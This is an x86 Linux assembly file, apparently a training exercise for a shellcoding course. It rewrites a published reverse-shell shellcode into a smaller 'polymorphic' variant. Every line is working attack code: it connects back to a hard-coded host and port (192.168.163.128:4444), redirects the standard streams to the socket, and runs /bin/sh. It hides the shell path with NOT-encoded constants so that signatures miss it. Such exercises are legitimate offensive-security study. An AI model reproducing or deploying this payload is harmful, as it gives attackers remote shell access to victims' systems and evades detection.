global _start
section .text
;Auther: H4554n AlMusajjen
;SLAE - 1057 
; Orginal Shellcode: https://www.exploit-db.com/exploits/25497/
; Original Shellcode size is 92 bytes 
; my polymorphic version is 87 bytes 
_start:

	;int socketcall(int call, unsigned long *args)
	push 0x66
	pop	eax		;saving one byte here
	xor	ebx,ebx
	cdq			;edx and ecx xoring has been deleted and three bytes has been saved 
	push	ebx		;pushing ebx insted of ecx as 0x0
	inc	ebx		;saving one byte instead of mov bl,0x1
	push	0x6
	push	ebx		;pushing ebx as 0x1 and saving one byte 
				;insted of push 0x1 
	push	0x2
	mov	ecx,esp
	int	0x80
	xchg	esi,eax		;swapping data instead of moving it and 
				;saving one more byte
	mov     al,0x66
	push 	byte 0x2
	pop 	ebx		;this will save us one byte
				;insted of xoring and moving 0x2
	push    0x80a3a8c0	; ip address "192.168.163.128"
	push	word   0x5c11	; port numbrt "4444"
	push 	word   bx
	inc     bl
	mov     ecx,esp
	push    0x10
	push    ecx
	push    esi
	mov     ecx,esp
	int     0x80
	push	0x3
	pop	ecx		;saving one more byte by pushing and-
				;poping it into ecx insted of xoring and-
				; moving 0x3 

dupfd:
	dec     cl
	mov     al,0x3f
	int     0x80
	jne     dupfd
	push    edx
	push    0x978cd091
	not dword [esp]		
	push    0x969dd0d0
	not dword [esp]		;six bytes has been added to decode /bin/sh
	mov     ebx,esp
	push    edx
	push    ebx
	mov     ecx,esp
	push    edx
	mov     edx,esp
	mov	al,0xb
	int     0x80
